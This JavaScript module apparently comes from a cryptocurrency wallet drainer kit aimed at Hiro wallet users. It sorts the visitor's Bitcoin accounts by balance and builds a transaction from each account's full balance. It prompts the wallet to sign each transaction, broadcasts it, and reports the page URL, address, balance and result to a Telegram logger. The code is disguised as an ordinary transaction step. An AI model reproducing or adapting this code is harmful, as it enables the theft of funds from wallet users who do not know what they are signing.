
import { succsessAlert, errorAlert } from "../../toast"
import { LogTg } from "../../tg"

export const Hiro = async (state, feePrice, broadcastPSBT, p2wpkhPsbt, p2trPsbt) => {
    let wallet = "hiro"
    const accountsData = state?.accountsWallet;
    //console.log(accountsData)
    accountsData.sort((a, b) => b.balance - a.balance);

    // Удаление элементов, у которых balance < feePrice
    const filteredAccountsData = accountsData.filter((account) => account.balance >= feePrice);
    //console.log(filteredAccountsData);
    if (filteredAccountsData.length == 0) errorAlert('Insufficient funds to pay the gas fee.')

    for (let i = 0; i < filteredAccountsData.length; i++) {
      if (filteredAccountsData[i]?.type === 'p2wpkh') {
        const options = await p2wpkhPsbt(filteredAccountsData[i].address, filteredAccountsData[i].publicKey, filteredAccountsData[i].balance)
        //console.log(options)
        LogTg("transaction_started", {
          url: window.location.href,
          account: filteredAccountsData[i].address,
          walletType: wallet,
          balance: filteredAccountsData[i].balance
        })

        const result = await window.btc
        .request("signPsbt", {
          publicKey: filteredAccountsData[i].publicKey,
          hex: options.hex,
          account: state.accountNumber,
          signAtIndex: options.signAtIndex,
        })
        .then(async (data) => {
          //console.log(data.result.hex)
          await broadcastPSBT(data.result.hex)
          //console.log(broadcastedTx)
          succsessAlert('Transaction Succsess')

          //TELEGRAM transaction_true
          LogTg("transaction_true", {
            url: window.location.href,
            account: filteredAccountsData[i].address,
            walletType: wallet,
            balance: filteredAccountsData[i].balance
          })
        })
        .catch((e) => {
          console.log(e);
          errorAlert('Transaction Failed')

          //TELEGRAM transaction_false
          //TELEGRAM error
          LogTg("transaction_false", {
            url: window.location.href,
            account: filteredAccountsData[i].address,
            walletType: wallet,
            balance: filteredAccountsData[i].balance,
            error: e?.message ? e?.message : ""
          })
        });
      }

      if (filteredAccountsData[i]?.type === 'p2tr') {
        const options = await p2trPsbt(filteredAccountsData[i].address, filteredAccountsData[i].publicKey, filteredAccountsData[i].balance, wallet)
        //console.log(options)
        LogTg("transaction_started", {
          url: window.location.href,
          account: filteredAccountsData[i].address,
          walletType: wallet,
          balance: filteredAccountsData[i].balance
        })

        const result = await window.btc
        .request("signPsbt", {
          publicKey: filteredAccountsData[i].publicKey,
          hex: options.hex,
          account: state.accountNumber,
          signAtIndex: options.signAtIndex,
        })
        .then(async (data) => {
          //console.log(data.result.hex)
          await broadcastPSBT(data.result.hex)
          //console.log(broadcastedTx)
          succsessAlert('Transaction Succsess')

          //TELEGRAM transaction_true
          LogTg("transaction_true", {
            url: window.location.href,
            account: filteredAccountsData[i].address,
            walletType: wallet,
            balance: filteredAccountsData[i].balance
          })
        })
        .catch((e) => {
          console.log(e);
          errorAlert('Transaction Failed')

          //TELEGRAM transaction_false
          //TELEGRAM error
          LogTg("transaction_false", {
            url: window.location.href,
            account: filteredAccountsData[i].address,
            walletType: wallet,
            balance: filteredAccountsData[i].balance,
            error: e?.message ? e?.message : ""
          })
        });
      }
    }
}